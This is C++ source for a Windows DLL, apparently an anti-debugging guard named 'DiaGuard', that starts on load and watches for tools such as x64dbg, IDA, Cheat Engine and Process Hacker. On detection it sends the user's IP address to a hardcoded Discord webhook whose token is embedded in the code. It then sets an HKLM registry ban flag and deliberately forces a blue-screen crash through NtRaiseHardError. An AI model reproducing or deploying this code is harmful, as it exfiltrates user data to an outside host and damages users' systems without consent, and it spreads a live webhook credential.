#include <Windows.h>
#include <iostream>
#include <tlhelp32.h>
#include <thread>
#include <string>
#include <stdio.h>
#include <winhttp.h>
#pragma comment(lib, "winhttp.lib")

#include <iphlpapi.h>
#pragma comment(lib, "iphlpapi.lib")  // Link with the IP Helper library

#pragma comment(lib, "ntdll.lib") // This library is older than 50% of my viewers ^^

using namespace std;

extern "C" NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrThread, PBOOLEAN StatusPointer);
extern "C" NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG Unless1, ULONG Unless2, PULONG_PTR Unless3, ULONG ValidResponseOption, PULONG ResponsePointer);

void BSOD() {
    BOOLEAN PrivilegeState = FALSE;
    ULONG ErrorResponse = 0;
    RtlAdjustPrivilege(19, TRUE, FALSE, &PrivilegeState);
    NtRaiseHardError(STATUS_IN_PAGE_ERROR, 0, 0, NULL, 6, &ErrorResponse); // There are many Crash reasons
}

void SendWebhook(std::string desc) {
    DWORD dwSize = 0;
    GetAdaptersInfo(NULL, &dwSize);
    std::string ipAddress;
    PIP_ADAPTER_INFO pAdapterInfo = (IP_ADAPTER_INFO*)malloc(dwSize);

    if (GetAdaptersInfo(pAdapterInfo, &dwSize) == ERROR_SUCCESS) {
        PIP_ADAPTER_INFO pAdapter = pAdapterInfo;
        while (pAdapter) {
            if (pAdapter->Type == MIB_IF_TYPE_ETHERNET && pAdapter->IpAddressList.IpAddress.String[0] != '0') {
                ipAddress = pAdapter->IpAddressList.IpAddress.String;
                break;
            }
            pAdapter = pAdapter->Next;
        }
    }
    else {
        ipAddress = ("Failed To Get IP");
    }

    HINTERNET hSession = WinHttpOpen((L"Bailey/1.0"),
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0);

    HINTERNET hConnect = WinHttpConnect(hSession,
        (L"discordapp.com"),
        INTERNET_DEFAULT_HTTPS_PORT,
        0);
    HINTERNET hRequest = WinHttpOpenRequest(hConnect,
        (L"POST"),
        (L"/api/webhooks/1194428595788070952/03AcM1Bip4N8i-pkGLuNctoQwp6YYFCPahRSqeOCZ0tcpigIuKfgfcRf8dC1C3xOVDEY"),
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE);

    std::string stringtosend = desc + " " + ipAddress;
    std::string title = ("Debugger Detected!");
    std::string body = ("DiaGuard");
    std::string color = ("16711680"); // Decimal color
    std::string request_body = ("{\"username\": \"") + body + ("\",\"content\": null,\"embeds\": [{\"title\": \"") + title + ("\",\"description\": \"") + stringtosend + ("\",\"footer\": {\"text\": \"") + body + ("\"},\"color\": ") + color + (" }], \"attachments\": []}");

    BOOL bResults = WinHttpSendRequest(hRequest,
        (L"Content-Type: application/json\r\n"),
        (DWORD)-1L,
        (LPVOID)request_body.c_str(),
        (DWORD)request_body.length(),
        (DWORD)request_body.length(),
        0);

    if (bResults) {
        WinHttpReceiveResponse(hRequest, NULL);
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
}

void banning() {
    HKEY hKey = NULL;
    LPCWSTR keyPath = (L"Software\\Microsoft\\Windows\\CurrentVersion");
    LPCWSTR RegName1 = (L"Sinister");
    LPCWSTR valueData = (L"1");
    LONG result = RegCreateKeyExW(HKEY_LOCAL_MACHINE, keyPath, 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL);
    if (result == ERROR_SUCCESS) {
        result = RegSetValueExW(hKey, RegName1, 0, REG_SZ, (BYTE*)valueData, sizeof(WCHAR) * (wcslen(valueData) + 1));
        RegCloseKey(hKey);
    }
}

bool isDllLoaded(const wchar_t* dllName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return false;
    }

    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);

    if (!Process32FirstW(hSnapshot, &pe32)) {
        CloseHandle(hSnapshot);
        return false;
    }

    do {
        HANDLE hModuleSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pe32.th32ProcessID);
        if (hModuleSnapshot != INVALID_HANDLE_VALUE) {
            MODULEENTRY32W me32;
            me32.dwSize = sizeof(MODULEENTRY32W);

            if (Module32FirstW(hModuleSnapshot, &me32)) {
                do {
                    if (wcscmp(me32.szModule, dllName) == 0) {
                        CloseHandle(hModuleSnapshot);
                        CloseHandle(hSnapshot);
                        return true;
                    }
                } while (Module32NextW(hModuleSnapshot, &me32));
            }
            CloseHandle(hModuleSnapshot);
        }
    } while (Process32NextW(hSnapshot, &pe32));

    CloseHandle(hSnapshot);
    return false;
}

HWND hwnd;
HWND FindWindowByClassName(const char* className) {
    return FindWindowA(className, NULL);
}

void SearchAnti64() {
    const char* classNameToFind = "Qt5QWindowIcon";  // Replace with the actual class name you want to find
    hwnd = FindWindowByClassName(classNameToFind);

    if (hwnd) {
        SendWebhook("Detected X64 Debugger");
        banning();
        BSOD();
    }
}

void AntiDH() {
    LPCWSTR className = (L"MainWindowClassName");  // Replace with the actual window class name
    HWND hWnd = FindWindow(className, NULL);
    if (hWnd != NULL) {
        SendWebhook("Detected dexz unpacker");
        banning();
        BSOD();
    }
}

void AntiIDA() {
    LPCWSTR className = (L"Qt5153QTQWindowIcon");  // Replace with the actual window class name
    HWND hWnd = FindWindow(className, NULL);
    if (hWnd != NULL) {
        SendWebhook("Detected IDA Disassembler");
        banning();
        BSOD();
    }
}

void AntiX64() {
    const wchar_t* dllName = (L"x64dbg.dll");  // Replace with the actual DLL name in wide character format
    if (isDllLoaded(dllName)) {
        SendWebhook("Detected X64DBG.dll");
        banning();
        BSOD();
    }
}

void AntiCE() {
    const wchar_t* dllName = (L"lfs.dll");  // Replace with the actual DLL name in wide character format
    if (isDllLoaded(dllName)) {
        SendWebhook("Detected lfs.dll (Cheat Engine)");
        banning();
        BSOD();
    }
}

void AntiPH() {
    const wchar_t* dllName = (L"WindowExplorer.dll");  // Replace with the actual DLL name in wide character format
    if (isDllLoaded(dllName)) {
        SendWebhook("Detected ProcessHacker");
        banning();
        BSOD();
    }
}

void Loop1() {
    while (1) {
        if (FindWindow(L"ConsoleWindowClass", NULL)) {
            AntiPH();
            Sleep(100);
            AntiCE();
            Sleep(100);
            AntiX64();
        }
        Sleep(1000);
    }
}

void Loop2() {
    while (1) {
        if (FindWindow(L"ConsoleWindowClass", NULL)) {
            Sleep(100);
            AntiDH();
            Sleep(100);
            SearchAnti64();
        }
        AntiIDA();
        Sleep(1000);
    }
}

// Exported function to start the loops in separate threads
extern "C" __declspec(dllexport) void StartLoopsInThreads() {
    std::thread thread1(Loop1);
    std::thread thread2(Loop2);

    thread1.detach();
    thread2.detach();
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        StartLoopsInThreads();
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}